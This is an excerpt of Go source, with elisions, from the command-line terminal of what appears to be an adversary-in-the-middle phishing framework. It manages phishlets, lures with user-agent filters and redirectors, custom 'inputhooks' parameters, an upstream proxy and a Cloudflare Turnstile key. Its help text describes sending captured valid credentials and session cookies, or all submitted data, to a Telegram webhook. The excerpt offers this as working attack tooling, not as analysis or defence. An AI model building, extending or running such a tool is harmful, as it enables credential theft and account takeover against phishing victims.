...
func (t *Terminal) DoWork() {
	...
	for !do_quit {
		...
		case "inputhooks":
			cmd_ok = true
			err := t.handleHooks(args[1:])
			if err != nil {
				log.Error("hooks: %v", err)
			}
		case "lures":
			cmd_ok = true
...
func (t *Terminal) handleConfig(args []string) error {
	pn := len(args)
	if pn == 0 {
		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "verbosity", "webhook_telegram", "turnstile_key"}
		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, strconv.Itoa(t.cfg.general.Verbosity), t.cfg.general.WebhookTelegram, t.cfg.general.TurnstileKey}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 2 {
		switch args[0] {
...
func (t *Terminal) handleHooks(args []string) error {
	yellow := color.New(color.FgYellow)
	cyan := color.New(color.FgCyan)

	pn := len(args)
	if pn == 0 {
	    cols := []string{"parameter_id", "name", "value"}
		hooks := t.cfg.GetHooks()
		if len(hooks) == 0 {
			log.Info("no parameters found")
			return nil
		}
		var rows [][]string
		for n, hook :=range hooks {
		    rows = append(rows, []string{fmt.Sprintf("%d", n), "{"+hook.Name+"}", hook.Value})
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		...
		for n, hook :=range hooks {
		    if n == id {
				...
				s_found = true
	            cols := []string{"parameter_id", "name", "value"}
		        rows := []string{fmt.Sprintf("%d", n), yellow.Sprint("{"+hook.Name+"}"), cyan.Sprint(hook.Value)}
		        result := AsRows(cols, rows)
		        log.Printf("\n%s\n", result)
		    }
		}
		if !s_found {
		...
		case "add":
			...
			if len(parts) != 2 {
				return fmt.Errorf("invalid syntax: add <key>:<value>")
			}
			...
			t.cfg.AddHooks(args[1], hook)
			log.Info("Added parameter with ID: %d", len(t.cfg.Hooks)-1)
		    return nil
		case "remove":
			if args[1] == "all" {
			    t.cfg.DeleteHooks()
				...
				if err != nil {
					return fmt.Errorf("invalid index for removing hook: %s", args[1])
				}
				t.cfg.DeleteHook(index)
				return nil
			}
		case "edit":
			index, err := strconv.Atoi(args[1])
			if err != nil {
				return fmt.Errorf("invalid index for editing hook: %s", args[1])
			}
			t.cfg.EditHookValue(index, args[2])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax for handling hooks")
}
...
func (t *Terminal) createHelp() {
	...
	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("verbosity"), readline.PcItem("webhook_telegram"), readline.PcItem("turnstile_key"), readline.PcItem("wildcards")))
	...
	h.AddSubCommand("config", []string{"verbosity"}, "verbosity <level>", "control what triggers webhook (0 - disabled, 1 - valid credentials and cookie sent only on final auth, 2 - all submitted data sent)")
	...
	h.AddCommand("eproxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
		readline.PcItem("eproxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
	h.AddSubCommand("eproxy", nil, "", "show all configuration variables")
	h.AddSubCommand("eproxy", []string{"enable"}, "enable", "enable proxy")
	h.AddSubCommand("eproxy", []string{"disable"}, "disable", "disable proxy")
	h.AddSubCommand("eproxy", []string{"type"}, "type <type>", "set proxy type: http (default), https, socks5, socks5h")
	h.AddSubCommand("eproxy", []string{"address"}, "address <address>", "set proxy address")
	h.AddSubCommand("eproxy", []string{"port"}, "port <port>", "set proxy port")
	h.AddSubCommand("eproxy", []string{"username"}, "username <username>", "set proxy authentication username")
	h.AddSubCommand("eproxy", []string{"password"}, "password <password>", "set proxy authentication password")
	...
	h.AddCommand("inputhooks", "general", "custom parameter for phishlets and redirectors", "Shows all custom parameter and allows to edit or delete them.", LAYER_TOP,
		readline.PcItem("inputhooks", readline.PcItem("add"), readline.PcItem("edit", readline.PcItemDynamic(t.hooksIdPrefixCompleter)), readline.PcItem("remove", readline.PcItem("all"))))

	h.AddSubCommand("inputhooks", nil, "", "Shows all custom parameter")
	h.AddSubCommand("inputhooks", nil, "<id>", "Show parameter details")
	h.AddSubCommand("inputhooks", []string{"edit"}, "edit <id> <value>", "to edit the variable of the chosen id key")
	h.AddSubCommand("inputhooks", []string{"remove"}, "remove <id>", "remove the parameter by <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
	h.AddSubCommand("inputhooks", []string{"remove", "all"}, "remove all", "remove all parameters")

	h.AddCommand("screen", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
...
func (t *Terminal) sprintLures() string {
	...
	white := color.New(color.FgHiWhite)
	//n := 0
	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "ua_filter", "redirect_url", "paused", "og"}
	var rows [][]string
	for n, l := range t.cfg.lures {
		var og string
		if l.OgTitle != "" {
		...
		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), green.Sprint(l.UserAgentFilter), yellow.Sprint(l.RedirectUrl), s_paused, og})
	}
	return AsTable(cols, rows)
}
...
func (t *Terminal) hooksIdPrefixCompleter(args string) []string {
	var ret []string
	for n := range t.cfg.Hooks {
		ret = append(ret, strconv.Itoa(n))
	}
	return ret
}
